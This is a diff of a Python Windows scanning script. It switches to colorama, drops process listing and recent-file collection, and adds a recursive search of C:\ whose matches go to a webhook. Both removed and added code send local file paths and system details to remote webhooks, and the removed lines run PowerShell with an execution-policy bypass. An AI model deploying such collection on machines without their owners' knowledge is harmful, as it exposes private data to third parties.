@@ -7,6 +7,10 @@ import platform
 import getpass
 import tempfile
 from datetime import datetime
+from colorama import Fore, Style, init
+
+# Initialize Colorama
+init(autoreset=True)
 
 # Webhook URLs
 WEBHOOK_URLS = {
@@ -47,13 +51,13 @@ def send_embed_to_webhook(title, description, color, url):
 
 def print_status(message, status='normal'):
     """Print status messages with color coding for real-time feedback."""
-    color_code = {
-        'error': '91',     # Red
-        'warning': '93',   # Yellow
-        'success': '92',   # Green
-        'normal': '0'      # Default
+    color = {
+        'error': Fore.RED,
+        'warning': Fore.YELLOW,
+        'success': Fore.GREEN,
+        'normal': Fore.RESET
     }
-    print(f"\033[{color_code[status]}m{message}\033[0m")
+    print(color[status] + message)
 
 def write_log(log_path, message):
     """Write messages to a log file."""
@@ -102,125 +106,53 @@ def scan_directory(directory, file_names=None):
 
     return results, total_files, scanned_files
 
-def get_processes():
-    command = 'powershell -ExecutionPolicy Bypass -Command "Get-Process | Select-Object -Property Name, Id, Path | ConvertTo-Json"'
-    output, error = run_command(command)
-    if error:
-        write_log(log_file, f"Failed to get processes: {error}")
-        print_status(f"Failed to get processes: {error}", 'error')
-    else:
-        write_log(log_file, "Retrieved processes.")
-        print_status("Retrieved processes.", 'success')
-    return output or f"Error: {error}"
-
-def get_admin_processes():
-    command = 'powershell -ExecutionPolicy Bypass -Command "Get-Process | Where-Object { $_.Path -like \'C:\\Windows\\System32\\*\' -or $_.Path -like \'C:\\Program Files*\\*\' } | Select-Object -Property Name, Id, Path | ConvertTo-Json"'
-    output, error = run_command(command)
-    if error:
-        write_log(log_file, f"Failed to get admin processes: {error}")
-        print_status(f"Failed to get admin processes: {error}", 'error')
-    else:
-        write_log(log_file, "Retrieved admin processes.")
-        print_status("Retrieved admin processes.", 'success')
-    return output or f"Error: {error}"
-
-def format_processes(processes):
-    try:
-        processes_json = json.loads(processes)
-        formatted = []
-        for process in processes_json:
-            name = process.get("Name", "Unknown")
-            pid = process.get("Id", "Unknown")
-            path = process.get("Path", "Unknown")
-            formatted.append(f"**{name}** (ID: {pid})\nPath: {path}")
-        return "\n".join(formatted) if formatted else "No processes detected"
-    except json.JSONDecodeError as e:
-        write_log(log_file, f"Format Processes Error: {e}")
-        print_status(f"Format Processes Error: {e}", 'error')
-        return f"Error decoding process data: {str(e)}"
-
-def find_process_traces(name):
-    """Find all traces of the specific process."""
-    traces = []
-    directories = [
-        'C:\\Windows\\System32',
-        'C:\\Program Files',
-        'C:\\Program Files (x86)',
-        'C:\\Users\\Public',
-        'C:\\Windows\\Temp',
-        'C:\\Users\\%USERNAME%\\AppData\\Local',
-        'C:\\Users\\%USERNAME%\\AppData\\Roaming',
-        'C:\\$Recycle.Bin',
-        'C:\\ProgramData',
-        'C:\\Documents and Settings',
-        'C:\\$Windows.~BT'
-    ]
-
-    # Scan specified directories
-    for directory in directories:
-        directory = directory.replace('%USERNAME%', getpass.getuser())
-        if os.path.exists(directory):
-            write_log(log_file, f"Scanning directory: {directory}")
-            print_status(f"Scanning directory: {directory}", 'normal')
-            for root, dirs, files in os.walk(directory):
-                for file in files:
-                    if name.lower() in file.lower():
-                        path = os.path.join(root, file)
-                        traces.append(path)
-                        write_log(log_file, f"Found trace: {path}")
-                        print_status(f"Found trace: {path}", 'warning')
-
-    return traces
-
-def find_recently_closed_files():
-    """Find recently closed files from the user's recent files list."""
-    recent_files = []
-    recent_folder = os.path.join(os.path.expanduser('~'), 'Recent')
-    
-    if os.path.exists(recent_folder):
-        try:
-            for file in os.listdir(recent_folder):
-                path = os.path.join(recent_folder, file)
-                recent_files.append(path)
-                write_log(log_file, f"Found recently closed file: {path}")
-                print_status(f"Found recently closed file: {path}", 'warning')
-        except Exception as e:
-            write_log(log_file, f"Failed to get recent files: {e}")
-            print_status(f"Failed to get recent files: {e}", 'error')
-
-    return recent_files
-
-def scan_recent_activity():
-    """Scan recent activity like file deletions, openings, and renaming."""
-    recent_activity = []
-    recent_files = find_recently_closed_files()
-    recent_activity.extend(recent_files)
-    # Add more activity detection here if needed
-    return recent_activity
-
 def scan_pc(specific_files=None):
-    """Scan the entire PC, checking directories for specific files."""
+    """Recursively scan the entire PC for specific files."""
     log_file = tempfile.mktemp(suffix=".log", dir=tempfile.gettempdir())
     results = {}
     total_files = 0
     scanned_files = 0
 
     if specific_files:
-        for file_name in specific_files:
-            file_results, tf, sf = scan_directory('C:\\', [file_name])
-            results[file_name] = file_results[file_name]
-            total_files += tf
-            scanned_files += sf
+        directories_to_scan = ['C:\\']
+        while directories_to_scan:
+            directory = directories_to_scan.pop()
+            print_status(f"Scanning directory: {directory}", 'normal')
+            try:
+                with os.scandir(directory) as it:
+                    for entry in it:
+                        if entry.is_dir(follow_symlinks=False):
+                            directories_to_scan.append(entry.path)
+                        else:
+                            for file_name in specific_files:
+                                if file_name.lower() in entry.name.lower():
+                                    path = entry.path
+                                    if file_name not in results:
+                                        results[file_name] = []
+                                    results[file_name].append(path)
+                                    write_log(log_file, f"Found file: {path}")
+                                    print_status(f"Found file: {path}", 'warning')
+                        scanned_files += 1
+                        total_files += 1
+            except PermissionError:
+                write_log(log_file, f"Permission denied: {directory}")
+                print_status(f"Permission denied: {directory}", 'error')
+                continue
+            except Exception as e:
+                write_log(log_file, f"Error scanning directory {directory}: {e}")
+                print_status(f"Error scanning directory {directory}: {e}", 'error')
+
+        for file_name, paths in results.items():
+            send_embed_to_webhook(
+                f"Traces of {file_name}",
+                f"Traces found in directories:\n" + "\n".join(paths),
+                0xFF0000,  # Red color
+                WEBHOOK_URLS['process_traces']
+            )
     else:
         # Scan entire PC without specific files
-        results, total_files, scanned_files = scan_directory('C:\\')
+        print_status("No specific files to scan.", 'error')
 
-    send_embed_to_webhook(
-        "PC Scan Results",
-        f"Total files found: {total_files}\nScanned files: {scanned_files}\n\nResults:\n{json.dumps(results, indent=2)}",
-        0x00FF00,  # Green color
-        WEBHOOK_URLS['process_traces']
-    )
     return results
 
 def get_system_information():
@@ -279,7 +211,6 @@ def main():
         )
     elif choice == '2':
         # Implement database search functionality here
-        # Ensure all relevant information is gathered and reported
         send_embed_to_webhook(
             "Database Search Results",
             "Database search results go here.",
